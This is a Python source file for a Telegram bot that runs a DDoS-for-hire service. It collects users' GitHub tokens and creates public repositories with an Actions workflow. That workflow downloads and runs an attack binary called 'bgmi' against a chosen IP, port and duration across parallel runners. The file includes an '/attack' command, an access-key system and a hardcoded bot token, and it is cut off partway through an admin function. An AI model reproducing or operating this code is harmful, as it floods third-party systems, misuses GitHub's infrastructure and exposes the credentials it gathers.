import os
import json
import random
import string
import requests
import asyncio
import base64
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime, timedelta

# 🎯 Configuration Section - YAHI PE APNA TOKEN DALNA
BOT_TOKEN = "7785414305:AAHHzgLfcnCWkmWcxXwdZKsUsVjdGQFTDGE"  # 🔑 YAHAN TOKEN DALDO

# Files configuration
ACCOUNTS_FILE = "accounts.json"
TOKEN_USERS_FILE = "token_users.json"
KEYS_FILE = "keys.json"
ADMIN_IDS_FILE = "admin_ids.json"
APPROVED_USERS_FILE = "approved_users.json"
OWNER_NAME = "@NEOBLADE71 💀🔥"
CREATOR = "NEO 🚀"
BOT_START_TIME = time.time()

# 🖼️ Photo Configuration - ONLINE URL YA LOCAL FILE
BOT_PHOTO_URL = "https://mental-aquamarine-hghjpfnrob.edgeone.app/mqdefault.jpg"

BOT_PHOTO_CAPTION = """
🔥 **DETACUP BOT SYSTEM** 🚀
    
🤖 **THIS BOT IS MADE BY: NEO🚀**

🎯 **OWNER: @NEOBLADE71**

💀 **MANAGED BY: @NEOBLADE71**

⚡ **Powerful GitHub-Based Operations Platform**
🔧 **Advanced Token Management System**
🎮 **User-Friendly Interface**

🚀 **READY FOR ACTION!**
"""

# 🎨 Load configuration functions
def load_json_file(filename, default_value):
    """Load JSON data from file with error handling"""
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
    except Exception as e:
        print(f"❌ Error loading {filename}: {e}")
    return default_value

def save_json_file(filename, data):
    """Save JSON data to file with error handling"""
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        print(f"❌ Error saving {filename}: {e}")
        return False

# 🔧 Initialize data structures
ADMIN_IDS = load_json_file(ADMIN_IDS_FILE, {"admin_ids": [7769457936]})["admin_ids"]
APPROVED_USERS = load_json_file(APPROVED_USERS_FILE, {"approved_users": ADMIN_IDS})["approved_users"]
TOKEN_USERS = load_json_file(TOKEN_USERS_FILE, {"token_users": {}})["token_users"]
KEYS_DATA = load_json_file(KEYS_FILE, {"keys": {}, "key_counter": 1}) 

# 🎪 GitHub Manager Class
class GitHubManager:
    def __init__(self, token):
        self.token = token
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }
        self.username = self.get_username()

    def get_username(self):
        """Get GitHub username from token"""
        try:
            response = requests.get("https://api.github.com/user", headers=self.headers)
            if response.status_code == 200:
                return response.json()['login']
            return "unknown"
        except Exception as e:
            return f"error_{random.randint(1000,9999)}"

    def create_random_repo(self, prefix="attack"):
        """Create random repository on GitHub"""
        repo_name = f"{prefix}{''.join(random.choices(string.digits, k=8))}"
        url = "https://api.github.com/user/repos"
        data = {
            "name": repo_name,
            "description": "Auto-generated repository for operations",
            "auto_init": True,
            "private": False
        }
        
        try:
            response = requests.post(url, json=data, headers=self.headers)
            return repo_name if response.status_code == 201 else None
        except:
            return None

    def setup_workflow(self, repo_name):
        """Setup GitHub workflow for operations"""
        workflow_content = """name: 🔥 DETACUP Instant Operation
on: 
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP Address'
        required: true
        type: string
      target_port: 
        description: 'Target Port'
        required: true
        type: string
      attack_duration:
        description: 'Operation Duration (seconds)'
        required: true
        type: string

permissions:
  contents: write

jobs:
  fire:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        instance: [1, 2, 3, 4, 5]
    steps:
      - name: 🚀 Ultra-Fast Binary Deployment
        run: |
          wget -q "https://raw.githubusercontent.com/flamedimdos-a11y/2/main/bgmi" -O bgmi
          chmod +x bgmi
          echo "✅ Binary deployment successful"
          
      - name: 💥 Execute Operation
        timeout-minutes: 10
        continue-on-error: true
        run: |
          echo "🎯 Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
          echo "⏰ Duration: ${{ inputs.attack_duration }} seconds"
          echo "🔢 Instance: ${{ matrix.instance }}"
          echo "🔥 Launching: ./bgmi ${{ inputs.target_ip }} ${{ inputs.target_port }} ${{ inputs.attack_duration }} 890"
          ./bgmi "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.attack_duration }}" 890
          echo "✅ Operation completed on instance ${{ matrix.instance }}"
"""

        url = f"https://api.github.com/repos/{self.username}/{repo_name}/contents/.github/workflows/operation.yml"
        
        data = {
            "message": "Add operation workflow",
            "content": base64.b64encode(workflow_content.encode()).decode()
        }
        
        try:
            response = requests.put(url, json=data, headers=self.headers)
            return response.status_code == 201
        except:
            return False

    def trigger_workflow(self, repo_name, ip, port, duration):
        """Trigger workflow for operation"""
        url = f"https://api.github.com/repos/{self.username}/{repo_name}/actions/workflows/operation.yml/dispatches"
        data = {
            "ref": "main",
            "inputs": {
                "target_ip": ip,
                "target_port": port,
                "attack_duration": duration
            }
        }
        
        try:
            response = requests.post(url, json=data, headers=self.headers)
            return response.status_code == 204
        except:
            return False

# 🎯 Bot Manager Class
class AttackBot:
    def __init__(self):
        self.accounts = []
        self.load_accounts()

    def load_accounts(self):
        """Load accounts from storage"""
        self.accounts = load_json_file(ACCOUNTS_FILE, {"accounts": []})["accounts"]

    def save_accounts(self):
        """Save accounts to storage"""
        return save_json_file(ACCOUNTS_FILE, {"accounts": self.accounts})

    def is_valid_ip(self, ip):
        """Validate IP address format"""
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            if not part.isdigit() or not 0 <= int(part) <= 255:
                return False
        return True

    def is_valid_input(self, ip, port, duration):
        """Validate operation input parameters"""
        if not self.is_valid_ip(ip):
            return False
        if not port.isdigit() or not 1 <= int(port) <= 65535:
            return False
        if not duration.isdigit() or not 1 <= int(duration) <= 120:  # Max 120 seconds
            return False
        return True

# 🎮 Initialize Bot Manager
bot_manager = AttackBot()

# 🔐 Authentication Functions - FIXED VERSIONS
def is_admin(user_id):
    """Check if user is admin"""
    return user_id in ADMIN_IDS

def is_special_approved(user_id):
    """Check if user is special approved"""
    return user_id in APPROVED_USERS

def is_token_user(user_id):
    """Check if user has valid token access - FIXED VERSION"""
    if user_id in TOKEN_USERS:
        expiry_time = TOKEN_USERS[user_id].get('expiry_time')
        # FIX: Check if expiry_time is not None before comparison
        if expiry_time is not None and time.time() < expiry_time:
            return True
        else:
            # Remove expired token user
            del TOKEN_USERS[user_id]
            save_json_file(TOKEN_USERS_FILE, {"token_users": TOKEN_USERS})
    return False

def get_user_tokens(user_id):
    """Get tokens for specific user"""
    return TOKEN_USERS.get(user_id, {}).get('tokens', [])

def add_user_token(user_id, token_data):
    """Add token for user"""
    if user_id not in TOKEN_USERS:
        TOKEN_USERS[user_id] = {'tokens': [], 'expiry_time': None}
    TOKEN_USERS[user_id]['tokens'].append(token_data)
    save_json_file(TOKEN_USERS_FILE, {"token_users": TOKEN_USERS})

def set_user_access_duration(user_id, days):
    """Set access duration for token user - FIXED VERSION"""
    if user_id not in TOKEN_USERS:
        TOKEN_USERS[user_id] = {'tokens': [], 'expiry_time': None}
    
    current_time = time.time()
    current_expiry = TOKEN_USERS[user_id].get('expiry_time')
    
    # FIX: Handle None case for current_expiry
    if current_expiry is None:
        # If no expiry set, start from now
        new_expiry = current_time + (days * 24 * 60 * 60)
    elif current_expiry > current_time:
        # If current expiry is in future, extend from there
        new_expiry = current_expiry + (days * 24 * 60 * 60)
    else:
        # If expired, start from now
        new_expiry = current_time + (days * 24 * 60 * 60)
    
    TOKEN_USERS[user_id]['expiry_time'] = new_expiry
    save_json_file(TOKEN_USERS_FILE, {"token_users": TOKEN_USERS})

# 🎨 Key Management System
def generate_key(duration_days):
    """Generate access key"""
    key_id = KEYS_DATA["key_counter"]
    key_string = f"DETACUP{key_id:06d}{random.randint(1000,9999)}"
    
    KEYS_DATA["keys"][key_string] = {
        "duration": duration_days,
        "created_at": time.time(),
        "used_by": None,
        "active": True
    }
    KEYS_DATA["key_counter"] += 1
    
    save_json_file(KEYS_FILE, KEYS_DATA)
    return key_string

def use_key(key_string, user_id):
    """Use access key"""
    if key_string in KEYS_DATA["keys"] and KEYS_DATA["keys"][key_string]["active"]:
        key_data = KEYS_DATA["keys"][key_string]
        if key_data["used_by"] is None:
            key_data["used_by"] = user_id
            key_data["active"] = False
            set_user_access_duration(user_id, key_data["duration"])
            save_json_file(KEYS_FILE, KEYS_DATA)
            return True, key_data["duration"]
    return False, 0

def destroy_key(key_string):
    """Destroy access key"""
    if key_string in KEYS_DATA["keys"]:
        del KEYS_DATA["keys"][key_string]
        save_json_file(KEYS_FILE, KEYS_DATA)
        return True
    return False

# ⚡ Broadcast System
async def broadcast_message(context: ContextTypes.DEFAULT_TYPE, message: str):
    """Broadcast message to all users"""
    all_users = set(ADMIN_IDS + APPROVED_USERS + list(TOKEN_USERS.keys()))
    success = 0
    
    for user_id in all_users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success += 1
            await asyncio.sleep(0.1)  # Rate limiting
        except Exception as e:
            print(f"❌ Failed to send to {user_id}: {e}")
    
    return success, len(all_users)

# 🖼️ Photo Handling Functions
async def send_bot_photo(update: Update, context: ContextTypes.DEFAULT_TYPE, caption=None):
    """Send bot photo with online URL"""
    try:
        await update.message.reply_photo(
            photo=BOT_PHOTO_URL,
            caption=caption or BOT_PHOTO_CAPTION,
            parse_mode='Markdown'
        )
        return True
    except Exception as e:
        print(f"❌ Error sending photo: {e}")
        # Fallback to text
        await update.message.reply_text(
            caption or BOT_PHOTO_CAPTION,
            parse_mode='Markdown'
        )
        return False

# 🎭 Response Templates
async def send_unauthorized_response(update: Update):
    """Send unauthorized access response"""
    await update.message.reply_text(
        "🚫 **ACCESS DENIED!** 🔒\n\n"
        "❌ You are not authorized to use this command!\n\n"
        "💡 **To get access:**\n"
        "📧 Contact Admin: @NEOBLADE71\n"
        "🔑 Or use access key if available\n\n"
        "⚡ **Bot Created By:** NEO 🚀\n"
        "🎯 **Managed By:** @NEOBLADE71 💀🔥\n"
        "👑 **Owner:** @NEOBLADE71"
    )

async def send_admin_only_response(update: Update):
    """Send admin-only command response"""
    await update.message.reply_text(
        "👑 **ADMIN PRIVILEGES REQUIRED!** 🛡️\n\n"
        "❌ This command is exclusively for administrators!\n\n"
        "💡 Only trusted admins can execute this command\n"
        "⚡ For assistance, contact senior admin\n\n"
        "🔥 **DETACUP SECURITY SYSTEM** 💀\n"
        "👑 **Owner:** @NEOBLADE71"
    )

# 🎪 Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with photo and enhanced menu system"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    # Send the bot photo first
    await send_bot_photo(update, context)
    
    # Welcome message
    welcome_text = f"""
🎊 **WELCOME TO DETACUP BOT SYSTEM!** 🚀

👋 **Hello {user_name}!** 😊

⚡ **Powerful GitHub-Based Operations Platform**
🎯 **Created By:** {CREATOR}
🔥 **Managed By:** {OWNER_NAME}
👑 **Owner:** @NEOBLADE71

📊 **Your Status:**
🆔 User ID: `{user_id}`
👥 Role: {"👑 **ADMIN**" if is_admin(user_id) else "⭐ **SPECIAL USER**" if is_special_approved(user_id) else "🔑 **TOKEN USER**" if is_token_user(user_id) else "👤 **GUEST USER**"}

💡 Use /help to see available commands
🔧 Use /contact for admin support

🚀 **THIS BOT IS MADE BY NEO** 🎉

**READY FOR OPERATIONS!**
    """
    
    await update.message.reply_text(welcome_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced help command with categorized sections"""
    user_id = update.effective_user.id
    
    help_text = f"""
🆘 **DETACUP BOT - COMMAND HELP** 🚀

⚡ **BASIC COMMANDS:**
/start - 🎊 Start the bot with photo
/help - 🆘 Show this help message  
/myid - 🆔 Get your user ID
/status - 📡 Check bot status
/stats - 📊 View bot statistics
/contact - 📞 Contact admin
/myaccount - 👤 Check your account details

🎯 **OPERATION COMMANDS:**
/attack <ip> <port> <time> - 🚀 Launch operation (with photo)
/accounts - 📋 View available accounts

🔑 **TOKEN & ACCESS MANAGEMENT:**
/addtoken <token> - ➕ Add your GitHub token
/mytokens - 📝 View your tokens
/use_key <key> - 🔑 Use access key

    """
    
    # Add admin section if user is admin
    if is_admin(user_id):
        help_text += """
👑 **ADMIN COMMANDS:**
/addaccount <token> [prefix] - 🔧 Add account to main pool
/removeaccount <number> - 🗑️ Remove account (Admin Only)
/clear - 🧹 Clear all accounts
/approve <user_id> - ✅ Approve special user
/unapprove <user_id> - 🚫 Remove approval  
/list_approved - 📜 List approved users
/gen <days> - 🔑 Generate access key
/destroykey <key> - 💥 Destroy access key
/listkeys - 📋 List all keys
/broadcast <message> - 📢 Broadcast message
/githubcc - 🌐 Get GitHub token source
/cloudways_instant_approve - ⚡ Instant approve system
        """
    
    help_text += f"\n\n⚡ **Bot Framework:** Python-Telegram-Bot"
    help_text += f"\n🎯 **Creator:** {CREATOR}"
    help_text += f"\n🔥 **Manager:** {OWNER_NAME}"
    help_text += f"\n👑 **Owner:** @NEOBLADE71"

    await update.message.reply_text(help_text)

async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced ID command with user details"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    await update.message.reply_text(f"🆔 **Your User ID:** `{user_id}`\n👤 **Name:** {user_name}")

async def myaccount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced account details command"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    # Determine user role and details
    if is_admin(user_id):
        role = "👑 **ADMINISTRATOR**"
        perks = "• Full system access\n• User management\n• Key generation\n• Broadcast messages"
        expiry = "⏰ **Access:** Permanent 🎉"
    elif is_special_approved(user_id):
        role = "⭐ **SPECIAL APPROVED USER**"
        perks = "• Multi-account operations\n• Priority access\n• Extended features"
        expiry = "⏰ **Access:** Permanent ⭐"
    elif is_token_user(user_id):
        expiry_time = TOKEN_USERS[user_id]['expiry_time']
        days_left = (expiry_time - time.time()) / (24 * 60 * 60)
        role = f"🔑 **TOKEN USER**"
        perks = "• Personal token operations\n• Limited duration access"
        expiry = f"⏰ **Access Expires in:** {days_left:.1f} days"
    else:
        role = "👤 **GUEST USER**"
        perks = "• Basic commands only\n• Limited functionality"
        expiry = "⏰ **Access:** No active access"
    
    # Get token count
    token_count = len(get_user_tokens(user_id))
    
    response = f"""
👤 **ACCOUNT INFORMATION** 📊

**👤 Name:** {user_name}
**🆔 User ID:** `{user_id}`
**🎯 Role:** {role}
**📅 Joined:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**💎 PRIVILEGES:**
{perks}

**🔑 TOKEN STATUS:**
**📊 Tokens Added:** {token_count}
**💪 Firepower:** {token_count * 5} instances
{expiry}

**⚡ Bot Information:**
**🤖 Created by:** {CREATOR}
**🔥 Managed by:** {OWNER_NAME}
**👑 Owner:** @NEOBLADE71

**🚀 READY FOR ACTION!**
    """
    
    await update.message.reply_text(response)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced status command"""
    total_main_accounts = len(bot_manager.accounts)
    total_token_users = len(TOKEN_USERS)
    total_instances = total_main_accounts * 5
    
    # Calculate uptime
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_str = f"{uptime_seconds // 3600}h {(uptime_seconds % 3600) // 60}m"
    
    status_text = f"""
📡 **DETACUP BOT - SYSTEM STATUS** 🖥️

**⚡ OPERATIONAL STATUS:** 🟢 **ONLINE & READY**

**📊 RESOURCE STATISTICS:**
**🔧 Main Accounts:** `{total_main_accounts}`
**👤 Token Users:** `{total_token_users}`
**⚡ Total Instances:** `{total_instances}`
**⏰ Uptime:** `{uptime_str}`

**👥 USER MANAGEMENT:**
**👑 Admins:** `{len(ADMIN_IDS)}`
**⭐ Special Users:** `{len(APPROVED_USERS)}`
**🔑 Active Token Users:** `{total_token_users}`

**🎯 BOT INFORMATION:**
**🤖 Creator:** {CREATOR}
**🔥 Manager:** {OWNER_NAME}
**👑 Owner:** @NEOBLADE71
**📅 Launched:** {datetime.fromtimestamp(BOT_START_TIME).strftime('%Y-%m-%d %H:%M:%S')}

**💪 SYSTEM READY FOR OPERATIONS!** 🚀
    """
    
    await update.message.reply_text(status_text)

async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add personal GitHub token - NOW ALLOWED FOR ALL USERS"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "❌ **INVALID COMMAND USAGE!**\n\n"
            "💡 **Correct Format:**\n"
            "`/addtoken YOUR_GITHUB_TOKEN_HERE`\n\n"
            "🔗 **Get Token:**\n"
            "1. Go to GitHub Settings\n"
            "2. Developer Settings → Personal Access Tokens\n"
            "3. Generate new token with repo permissions\n"
            "4. Copy and use here\n\n"
            "⚠️ **Note:** Token will be stored securely"
        )
        return
    
    token = context.args[0]
    
    # ✅ MODIFIED: REMOVED ACCESS CHECK - NOW ALL USERS CAN ADD TOKENS
    # Koi bhi user token add kar sakta hai without any access requirements
    
    try:
        msg = await update.message.reply_text("🔄 **INITIATING TOKEN SETUP...** ⚙️")
        
        gh_manager = GitHubManager(token)
        
        await msg.edit_text("🔄 **CREATING REPOSITORY...** 📁")
        repo_name = gh_manager.create_random_repo(f"user{user_id}")
        
        if not repo_name:
            await msg.edit_text(
                "❌ **REPOSITORY CREATION FAILED!**\n\n"
                "💡 **Possible Issues:**\n"
                "• Invalid GitHub token\n"
                "• Token lacks repo permissions\n"
                "• GitHub API rate limit\n"
                "• Network connectivity issues\n\n"
                "🔧 **Solutions:**\n"
                "• Verify token permissions\n"
                "• Check token validity\n"
                "• Try again later"
            )
            return
        
        await msg.edit_text("🔄 **CONFIGURING WORKFLOW...** 🔧")
        if not gh_manager.setup_workflow(repo_name):
            await msg.edit_text(
                "❌ **WORKFLOW SETUP FAILED!**\n\n"
                "⚠️ Repository created but workflow setup failed!\n"
                "🔧 Check token permissions for workflow access"
            )
            return
        
        # Save token for user
        token_data = {
            "username": gh_manager.username,
            "token": token,
            "repo_name": repo_name,
            "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "active"
        }
        
        add_user_token(user_id, token_data)
        
        # ✅ MODIFIED: Give 30 days access when token is added successfully (FOR EVERYONE)
        set_user_access_duration(user_id, 30)
        
        success_text = f"""
✅ **TOKEN ADDED SUCCESSFULLY!** 🎉

**👤 User:** {user_name}
**🔧 GitHub Account:** `{gh_manager.username}`
**📁 Repository:** `{repo_name}`
**⚡ Instances:** `5`
**⏰ Access Duration:** `30 DAYS` 🎊

**💪 OPERATIONAL CAPABILITIES:**
• Launch operations with your token
• 5 concurrent instances per token
• Personal workflow management
• Unlimited tokens allowed! 🔥

**📊 Your Total Tokens:** {len(get_user_tokens(user_id))}
**💪 Your Total Firepower:** {len(get_user_tokens(user_id)) * 5} instances

**📅 Added On:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**🚀 READY FOR OPERATIONS!**
        """
        
        await msg.edit_text(success_text)
        
    except Exception as e:
        await update.message.reply_text(f"❌ **UNEXPECTED ERROR:** {str(e)}")

async def mytokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's tokens"""
    user_id = update.effective_user.id
    
    if user_id not in TOKEN_USERS or not TOKEN_USERS[user_id]['tokens']:
        await update.message.reply_text(
            "📭 **NO TOKENS FOUND!**\n\n"
            "💡 You haven't added any GitHub tokens yet!\n\n"
            "🔧 **To Add Token:**\n"
            "`/addtoken YOUR_GITHUB_TOKEN`\n\n"
            "🔗 **Get GitHub Token:**\n"
            "Use /githubcc for token sources\n\n"
            "🎯 **Benefits:**\n"
            "• 30 days access per token\n"
            "• 5 instances per token\n"
            "• Unlimited tokens allowed!"
        )
        return
    
    tokens = TOKEN_USERS[user_id]['tokens']
    expiry_time = TOKEN_USERS[user_id].get('expiry_time')
    
    if expiry_time:
        days_left = (expiry_time - time.time()) / (24 * 60 * 60)
        expiry_text = f"⏰ **Access Expires in:** {days_left:.1f} days\n"
    else:
        expiry_text = "⏰ **Access:** Permanent ⭐\n"
    
    token_list = "🔑 **YOUR GITHUB TOKENS:**\n\n"
    
    for i, token_data in enumerate(tokens, 1):
        token_list += f"{i}. **Account:** `{token_data['username']}`\n"
        token_list += f"   📁 Repo: `{token_data['repo_name']}`\n"
        token_list += f"   📅 Added: {token_data['added_at']}\n"
        token_list += f"   ⚡ Instances: `5`\n\n"
    
    token_list += expiry_text
    token_list += f"🔢 **Total Tokens:** {len(tokens)}\n"
    token_list += f"💪 **Total Power:** {len(tokens) * 5} instances\n"
    token_list += "🎯 **Unlimited tokens allowed!** 🔥"
    
    await update.message.reply_text(token_list)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced attack command with photo"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "🎯 **OPERATION LAUNCH FORMAT:**\n\n"
            "💡 **Usage:** `/attack IP PORT DURATION`\n\n"
            "📝 **Example:**\n"
            "`/attack 1.1.1.1 80 60`\n\n"
            "⚡ **Parameters:**\n"
            "• IP: Target IP address (IPv4)\n"
            "• PORT: Target port (1-65535)\n"
            "• DURATION: Operation time in seconds (1-120)\n\n"
            "🔒 **Security:** All operations are logged"
        )
        return
    
    ip, port, duration = context.args
    
    if not bot_manager.is_valid_input(ip, port, duration):
        await update.message.reply_text(
            "❌ **INVALID OPERATION PARAMETERS!**\n\n"
            "🔍 **Validation Failed:**\n"
            f"• IP: `{ip}` - {'✅ Valid' if bot_manager.is_valid_ip(ip) else '❌ Invalid'}\n"
            f"• Port: `{port}` - {'✅ Valid' if port.isdigit() and 1 <= int(port) <= 65535 else '❌ Invalid'}\n"
            f"• Duration: `{duration}s` - {'✅ Valid' if duration.isdigit() and 1 <= int(duration) <= 120 else '❌ Invalid'}\n\n"
            "💡 **Correct Format:**\n"
            "`/attack 192.168.1.1 80 60`"
        )
        return
    
    # Send attack photo first
    attack_caption = f"""
🚀 **DETACUP OPERATION INITIATED** 💥

**🎯 Target:** `{ip}:{port}`
**⏰ Duration:** `{duration}` seconds
**👤 Operator:** `{user_name}`
**⚡ System:** DETACUP BOT

**🔥 PREPARING FOR DEPLOYMENT...**
    """
    await send_bot_photo(update, context, attack_caption)
    
    # Determine which tokens to use
    if is_admin(user_id):
        # Admin uses all main accounts
        accounts_to_use = bot_manager.accounts
        account_type = "👑 **ADMIN ACCOUNTS**"
        account_source = "All main system accounts"
    elif is_special_approved(user_id):
        # Special approved users use main accounts
        accounts_to_use = bot_manager.accounts
        account_type = "⭐ **SPECIAL USER ACCOUNTS**"
        account_source = "Main system accounts pool"
    elif is_token_user(user_id):
        # Token users use only their own tokens
        accounts_to_use = get_user_tokens(user_id)
        account_type = "🔑 **PERSONAL TOKENS**"
        account_source = "Your personal GitHub tokens"
    else:
        await send_unauthorized_response(update)
        return
    
    if not accounts_to_use:
        await update.message.reply_text(
            "❌ **NO OPERATIONAL ACCOUNTS AVAILABLE!**\n\n"
            "💡 **Solutions:**\n"
            "• Add GitHub tokens using /addtoken\n"
            "• Contact admin for access\n"
            "• Use access key for temporary access\n\n"
            "🔧 Available to: Token Users & Special Users"
        )
        return
    
    total_accounts = len(accounts_to_use)
    total_instances = total_accounts * 5
    
    # Operation launch message
    launch_msg = await update.message.reply_text(
        f"🚀 **OPERATION IN PROGRESS!** 🔥\n\n"
        f"**🎯 Target:** `{ip}:{port}`\n"
        f"**⏰ Duration:** `{duration}` seconds\n"
        f"**👤 Operator:** `{user_name}`\n"
        f"**🔧 Account Type:** {account_type}\n"
        f"**📊 Accounts:** `0/{total_accounts}`\n"
        f"**⚡ Instances:** `0/{total_instances}`\n"
        f"**🔄 Status:** Initializing... ⚙️"
    )
    
    success_count = 0
    failed_tokens = []
    
    for i, account in enumerate(accounts_to_use, 1):
        try:
            token = account['token']
            repo_name = account['repo_name']
            
            gh_manager = GitHubManager(token)
            if gh_manager.trigger_workflow(repo_name, ip, port, duration):
                success_count += 1
            else:
                failed_tokens.append(account['username'])
            
            # Update progress
            progress = int((i / total_accounts) * 100)
            progress_bar = "🟢" * (progress // 10) + "⚪" * (10 - (progress // 10))
            
            await launch_msg.edit_text(
                f"🚀 **OPERATION IN PROGRESS!** 🔥\n\n"
                f"**🎯 Target:** `{ip}:{port}`\n"
                f"**⏰ Duration:** `{duration}` seconds\n"
                f"**👤 Operator:** `{user_name}`\n"
                f"**🔧 Account Type:** {account_type}\n"
                f"**📊 Accounts:** `{i}/{total_accounts}`\n"
                f"**⚡ Instances:** `{i * 5}/{total_instances}`\n"
                f"**📈 Progress:** {progress}% {progress_bar}\n"
                f"**✅ Successful:** `{success_count}` accounts"
            )
            
            await asyncio.sleep(0.5)  # Rate limiting
            
        except Exception as e:
            failed_tokens.append(account.get('username', 'Unknown'))
            continue
    
    # Final result
    if success_count > 0:
        result_text = f"""
✅ **OPERATION SUCCESSFULLY LAUNCHED!** 🎉

**🎯 Target:** `{ip}:{port}`
**⏰ Duration:** `{duration}` seconds
**👤 Operator:** `{user_name}`
**🔧 Account Type:** {account_type}
**📁 Account Source:** {account_source}

**📊 DEPLOYMENT RESULTS:**
**✅ Successful Accounts:** `{success_count}`
**⚡ Active Instances:** `{success_count * 5}`
**📈 Success Rate:** `{(success_count/total_accounts)*100:.1f}%`

**💪 FIREPOWER DEPLOYED!** 🔥
**🚀 OPERATION ACTIVE!** ⚡

**👑 DETACUP BOT SYSTEM**
**🎯 Owner:** @NEOBLADE71
**🔥 Manager:** TEJAS
**🤖 Creator:** NEO 🚀
        """
        
        if failed_tokens:
            result_text += f"\n**⚠️ Failed Tokens:** {len(failed_tokens)} accounts need attention"
    else:
        result_text = """
❌ **OPERATION FAILED!** 🚨

**💡 Possible Issues:**
• GitHub API rate limits
• Token permissions expired
• Repository access issues
• Network connectivity

**🔧 Solutions:**
• Check token validity
• Verify repository exists
• Try again later
• Contact admin support

**📞 Support:** @NEOBLADE71
        """
    
    await launch_msg.edit_text(result_text)

async def accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show available accounts based on user type"""
    user_id = update.effective_user.id
    
    if is_admin(user_id) or is_special_approved(user_id):
        # Show all main accounts
        if not bot_manager.accounts:
            await update.message.reply_text(
                "📭 **NO MAIN ACCOUNTS CONFIGURED!**\n\n"
                "💡 **Admin Action Required:**\n"
                "Use `/addaccount TOKEN` to add main accounts\n\n"
                "🔧 Main accounts are used by special users\n"
                "⚡ Each account provides 5 instances"
            )
            return
        
        accounts_text = "👑 **MAIN OPERATIONAL ACCOUNTS:**\n\n"
        total_instances = 0
        
        for i, acc in enumerate(bot_manager.accounts, 1):
            accounts_text += f"{i}. **{acc['username']}**\n"
            accounts_text += f"   📁 Repository: `{acc['repo_name']}`\n"
            accounts_text += f"   🔧 Prefix: `{acc['prefix']}`\n"
            accounts_text += f"   ⚡ Instances: `5`\n"
            accounts_text += f"   📅 Added: {acc['created_at']}\n\n"
            total_instances += 5
        
        accounts_text += f"💪 **TOTAL FIREPOWER:** `{total_instances}` instances\n"
        accounts_text += f"🔢 **ACCOUNT COUNT:** `{len(bot_manager.accounts)}` accounts\n"
        accounts_text += "👥 **ACCESS:** Special Approved Users & Admins"
        
    elif is_token_user(user_id):
        # Show user's personal tokens
        user_tokens = get_user_tokens(user_id)
        if not user_tokens:
            await update.message.reply_text(
                "🔑 **NO PERSONAL TOKENS FOUND!**\n\n"
                "💡 **Add Your Token:**\n"
                "`/addtoken YOUR_GITHUB_TOKEN`\n\n"
                "🔗 **Get Token:** Use /githubcc\n"
                "⏰ **Access Duration:** 30 days per token\n"
                "🎯 **Unlimited tokens allowed!** 🔥"
            )
            return
        
        accounts_text = "🔑 **YOUR PERSONAL TOKENS:**\n\n"
        total_instances = 0
        
        for i, token_data in enumerate(user_tokens, 1):
            accounts_text += f"{i}. **{token_data['username']}**\n"
            accounts_text += f"   📁 Repository: `{token_data['repo_name']}`\n"
            accounts_text += f"   ⚡ Instances: `5`\n"
            accounts_text += f"   📅 Added: {token_data['added_at']}\n\n"
            total_instances += 5
        
        expiry_time = TOKEN_USERS[user_id].get('expiry_time')
        if expiry_time:
            days_left = (expiry_time - time.time()) / (24 * 60 * 60)
            accounts_text += f"⏰ **Access Expires in:** {days_left:.1f} days\n"
        
        accounts_text += f"💪 **YOUR FIREPOWER:** `{total_instances}` instances\n"
        accounts_text += f"🔢 **YOUR TOKENS:** `{len(user_tokens)}` accounts\n"
        accounts_text += "🎯 **Unlimited tokens allowed!** 🔥"
        
    else:
        await send_unauthorized_response(update)
        return
    
    await update.message.reply_text(accounts_text)

# 👑 Admin Commands
async def add_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to add main account"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "👑 **ADMIN COMMAND USAGE:**\n\n"
            "💡 **Format:** `/addaccount TOKEN [PREFIX]`\n\n"
            "📝 **Examples:**\n"
            "`/addaccount ghp_abc123`\n"
            "`/addaccount ghp_xyz456 detacup`\n\n"
            "⚡ **Effects:**\n"
            "• Adds to main account pool\n"
            "• Available to special users\n"
            "• 5 instances per account"
        )
        return
    
    token = context.args[0]
    prefix = context.args[1] if len(context.args) > 1 else "main"
    
    try:
        msg = await update.message.reply_text("🔄 **ADMIN: ACCOUNT SETUP INITIATED...** ⚙️")
        
        gh_manager = GitHubManager(token)
        
        await msg.edit_text("🔄 **ADMIN: CREATING REPOSITORY...** 📁")
        repo_name = gh_manager.create_random_repo(prefix)
        
        if not repo_name:
            await msg.edit_text("❌ **ADMIN: REPOSITORY CREATION FAILED!**")
            return
        
        await msg.edit_text("🔄 **ADMIN: CONFIGURING WORKFLOW...** 🔧")
